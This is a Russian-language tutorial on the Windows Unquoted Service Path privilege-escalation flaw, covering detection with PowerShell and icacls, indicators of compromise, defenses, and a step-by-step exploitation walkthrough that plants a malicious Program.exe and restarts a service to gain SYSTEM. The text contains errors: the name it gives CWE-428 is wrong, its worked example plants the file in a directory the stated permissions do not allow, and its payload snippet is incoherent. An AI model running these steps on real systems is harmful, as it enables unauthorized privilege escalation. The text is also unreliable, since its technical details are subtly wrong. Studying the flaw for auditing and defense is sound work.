# Unquoted Service Path: Механизм, Эксплуатация и Детектирование

## Контекст и базовые понятия

Unquoted Service Path (USP) — это класс уязвимостей конфигурации Windows, возникающий при регистрации службы с путем к исполняемому файлу, содержащим пробелы, но не заключенным в кавычки. Уязвимость относится к CWE-428 (Unquoted Prime Field) и позволяет локальному злоумышленнику, имеющему права на запись в одну из промежуточных директорий пути, выполнить произвольный код с правами, назначенными службе (чаще всего `SYSTEM`).

Механизм базируется на особенностях парсинга путей командной строки в Windows API. Когда операционная система получает путь без кавычек, она не может однозначно определить, где заканчивается имя файла и начинаются аргументы. В результате Windows применяет алгоритм последовательного поиска исполняемого файла, разбивая путь по пробелам. Если файл с именем первой части пути не найден, система переходит к следующей комбинации, пока не найдет существующий `.exe` или не исчерпает варианты.

Ключевое разграничение: уязвимость существует только при одновременном выполнении двух условий:
1. Путь содержит пробелы и не экранирован кавычками.
2. У атакующего есть права на запись (`Write`/`Modify`) в директорию, соответствующую одной из промежуточных частей пути.

Если путь не содержит пробелов (например, `C:\ProgramData\Microsoft\Windows\Xyz\XyzSvc.exe`), кавычки не требуются, и уязвимость отсутствует, даже если путь технически «не в кавычках». Также уязвимость не работает, если атакующий не имеет прав на запись в промежуточные каталоги.

| Характеристика | Уязвимая конфигурация (Unquoted Service Path) | Безопасная конфигурация |
| :--- | :--- | :--- |
| **Наличие пробелов в пути** | Да (например, `C:\Program Files\App Name\app.exe`) | Да или Нет |
| **Наличие кавычек** | Отсутствуют | Присутствуют (`"C:\Program Files\App Name\app.exe"`) |
| **Механизм запуска** | Парсинг по пробелам (space-delimited) | Строковый литерал (exact match) |
| **Требование к правам** | Запись в промежуточную директорию | Не требуется для эксплуатации (но требуется для установки) |
| **Пример пути** | `C:\Program Files\My App\service.exe` | `"C:\Program Files\My App\service.exe"` |
| **Риск** | Высокий (LPE до SYSTEM) | Низкий/Отсутствует |

Артефакт уязвимости фиксируется в реестре Windows в ключе `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath`. Значение этого поля определяет, как Service Control Manager (SCM) запускает процесс.

```registry
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnerableService]
"ImagePath" = "C:\\Program Files\\Vulnerable App\\service.exe"
```

В данном примере отсутствие кавычек вокруг `C:\Program Files\...` делает службу уязвимой, если пользователь может записать файл `Program.exe` в корень диска `C:\`.

## Внутреннее устройство предмета

Эксплуатация Unquoted Service Path базируется на алгоритме разрешения путей (path resolution) в Windows. При запуске службы SCM считывает значение `ImagePath`. Если путь не заключен в кавычки и содержит пробелы, Windows интерпретирует его как набор аргументов, разделяемых пробелами, и пытается найти исполняемый файл, начиная с первого токена.

### Алгоритм разрешения пути

Рассмотрим путь: `C:\Program Files\My Application\app.exe`.
Windows не знает, что `My Application` — это часть имени каталога. Она рассматривает его как потенциальное имя файла. Алгоритм работает следующим образом:

1.  **Проверка первого токена:** Система ищет файл `C:\Program.exe`.
    *   Если файл существует, он запускается.
    *   Если не существует, переходим к шагу 2.
2.  **Проверка второго токена:** Система ищет файл `C:\Program Files\My.exe`.
    *   Если файл существует, он запускается.
    *   Если не существует, переходим к шагу 3.
3.  **Проверка третьего токена:** Система ищет файл `C:\Program Files\My Application\app.exe`.
    *   Если файл существует, он запускается. Это целевой файл.

Этот процесс продолжается до тех пор, пока не будет найден существующий файл или не будет исчерпан путь. Если злоумышленник может создать файл с именем, совпадающим с одним из промежуточных токенов (например, `Program.exe` в корне диска), он перехватывает выполнение.

### Условия эксплуатации

Для успешной эксплуатации необходимо соблюдение всех следующих условий:
1.  **Наличие пробелов:** Путь должен содержать пробелы.
2.  **Отсутствие кавычек:** Путь не должен быть экранирован кавычками в реестре.
3.  **Права на запись:** Атакующий должен иметь права `Write` или `Modify` на директорию, соответствующую одному из промежуточных токенов.
4.  **Контекст службы:** Служба должна запускаться с высокими привилегиями (например, `LocalSystem`), иначе эффект повышения привилегий будет ограничен правами учетной записи службы.

### Структура уязвимого пути

```text
[Диск]:\<Токен1>.exe
          │
          └───<Токен2>\
                    │
                    └───<Токен3>\
                              │
                              └───<Целевой_файл>.exe
```

Если атакующий может записать файл в `[Диск]:\`, он создает `<Токен1>.exe`. Если только в `<Токен2>\`, он создает `<Токен2>\<Токен1>.exe` (если первый не найден) или просто `<Токен2>.exe` (если система ищет второй токен как файл).

### Индикаторы наличия (IoC)

*   **Реестр:** Ключи `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` с путями, содержащими пробелы и не заключенными в кавычки.
*   **Файловая система:** Наличие исполняемых файлов с именами, совпадающими с частями пути (например, `Program.exe`, `Files.exe`), в директориях с широкими правами на запись.
*   **Логи:** События создания процессов (Event ID 4688 в Windows Security Log или Sysmon Event ID 1), где родительский процесс — `services.exe`, а дочерний — неожиданный бинарь из промежуточной директории.

## Применение и работа с предметом

На практике работа с Unquoted Service Path включает три этапа: обнаружение, анализ прав доступа и эксплуатация. Для обнаружения используются как ручные методы, так и автоматизированные инструменты.

### Обнаружение уязвимых служб

Ручное обнаружение требует проверки всех служб Windows. Команда `wmic` устарела в новых версиях Windows, поэтому предпочтительнее использовать PowerShell.

```powershell
# PowerShell: Поиск служб с путями, содержащими пробелы и не заключенными в кавычки
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*' -and 
    $_.PathName -like '* *' -and 
    $_.PathName -notlike 'C:\Windows\*'
} | Select-Object Name, DisplayName, PathName, StartName
```

Этот скрипт фильтрует службы, у которых:
1.  `PathName` не начинается с кавычки (`-notlike '"*'`).
2.  `PathName` содержит пробел (`-like '* *'`).
3.  `PathName` не находится в системной директории `C:\Windows\` (где права на запись ограничены).

### Анализ прав доступа

После обнаружения подозрительной службы необходимо проверить права на промежуточные директории. Для этого используется утилита `icacls`.

```bash
# Проверка прав на директорию C:\Program Files\My App
icacls "C:\Program Files\My App"
```

В выводе ищем разрешения для текущей учетной записи или группы `Users`. Если присутствует `(W)` (Write) или `(M)` (Modify), уязвимость эксплуатируема.

```text
C:\Program Files\My App BUILTIN\Users:(OI)(CI)(W)
```

### Эксплуатация

Эксплуатация заключается в создании вредоносного исполняемого файла с именем, соответствующим промежуточному токену пути, и размещении его в директории, где есть права на запись.

1.  **Определение токена:** Для пути `C:\Program Files\My App\app.exe` токены: `Program`, `Files`, `My`, `App`.
2.  **Выбор цели:** Если есть права на `C:\`, создаем `C:\Program.exe`. Если только на `C:\Program Files\`, создаем `C:\Program Files\Program.exe` (если первый токен не найден) или `C:\Program Files\My.exe` (если второй токен ищется как файл).
3.  **Запуск службы:** Перезапуск службы или перезагрузка системы приводит к выполнению вредоносного файла от имени `SYSTEM`.

```powershell
# Пример создания вредоносного файла (иллюстративная схема)
# Предположим, у нас есть права на C:\
$payload = @"
using System;
class Program {
    static void Main() {
        System.Diagnostics.Process.Start("cmd.exe", "/k whoami");
    }
}
"@
Add-Type -TypeDefinition $payload -Language CSharp
[System.IO.File]::WriteAllBytes("C:\Program.exe", [System.IO.File]::ReadAllBytes("malicious.exe"))
```

### Инструментарий

*   **PowerUp:** Модуль PowerShell для автоматизации проверки UAC, unquoted service paths и других векторов LPE.
    ```powershell
    Invoke-AllChecks
    ```
*   **WinPEAS:** Инструмент для аудита Windows, который автоматически выявляет unquoted service paths и проверяет права на них.
*   **SharpUp:** Аналог PowerUp, написанный на C#.

## Сквозной практический пример: Эксплуатация Unquoted Service Path

### Исходные условия
*   **Среда:** Windows 10/11 или Windows Server 2016/2019.
*   **Роль:** Локальный пользователь с правами `Standard User`.
*   **Цель:** Повышение привилегий до `SYSTEM`.
*   **Уязвимая служба:** `VulnerableService`, установленная с путем `C:\Program Files\My App\service.exe`.
*   **Права:** У пользователя есть права на запись в `C:\Program Files\My App\`.

### Шаг 1: Обнаружение уязвимой службы

Используем PowerShell для поиска служб с unquoted paths.

```powershell
# Команда для поиска
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*' -and $_.PathName -like '* *'
} | Select-Object Name, PathName
```

**Ожидаемый вывод:**
```text
Name             PathName
----             --------
VulnerableService C:\Program Files\My App\service.exe
```

### Шаг 2: Проверка прав доступа

Проверяем права на директорию `C:\Program Files\My App\`.

```bash
# Команда для проверки прав
icacls "C:\Program Files\My App"
```

**Ожидаемый вывод:**
```text
C:\Program Files\My App BUILTIN\Users:(OI)(CI)(W)
```
*Интерпретация:* `BUILTIN\Users` имеет право `Write` (W). Уязвимость эксплуатируема.

### Шаг 3: Подготовка вредоносного файла

Создаем вредоносный исполняемый файл с именем `Program.exe` (первый токен пути после диска).

```powershell
# Генерация payload (например, с помощью msfvenom или компиляции C#)
# Здесь иллюстративная схема: предположим, у нас есть файл malicious.exe
# Копируем его в C:\ с именем Program.exe
Copy-Item .\malicious.exe C:\Program.exe
```

**Ожидаемый результат:**
Файл `C:\Program.exe` создан. При запуске службы `VulnerableService` Windows сначала проверит `C:\Program.exe`.

### Шаг 4: Эксплуатация

Перезапускаем службу, чтобы инициировать выполнение вредоносного файла.

```powershell
# Перезапуск службы
Restart-Service -Name "VulnerableService"
```

**Ожидаемый вывод:**
Вредоносный файл `C:\Program.exe` выполняется от имени `SYSTEM`. Если payload открывает обратный шелл, мы получаем доступ к системе с правами `NT AUTHORITY\SYSTEM`.

### Ожидаемый вывод
Пример демонстрирует, как отсутствие кавычек в пути службы и права на запись в промежуточную директорию позволяют локальному пользователю выполнить произвольный код с высокими привилегиями. Это классический вектор локального повышения привилегий (LPE).

## Аналитический вывод

Unquoted Service Path представляет собой классическую уязвимость конфигурации, эксплуатируемую за счет неоднозначности парсинга путей в Windows. Несмотря на то, что уязвимость существует давно, она остается актуальной из-за распространенности программ, устанавливаемых в каталоги с пробелами (например, `Program Files`) без корректного экранирования путей в реестре. Эксплуатация требует локального доступа и прав на запись в промежуточные директории, что делает ее особенно опасной в средах с недостаточным контролем прав доступа.

Для защиты от USP необходимо:
1.  Всегда использовать кавычки в путях к службам.
2.  Ограничивать права на запись в директории установки программ.
3.  Регулярно аудировать службы с помощью инструментов вроде WinPEAS или PowerUp.
4.  Внедрять правила детектирования в EDR-системах, отслеживающие запуск процессов из нестандартных директорий с высокими привилегиями.
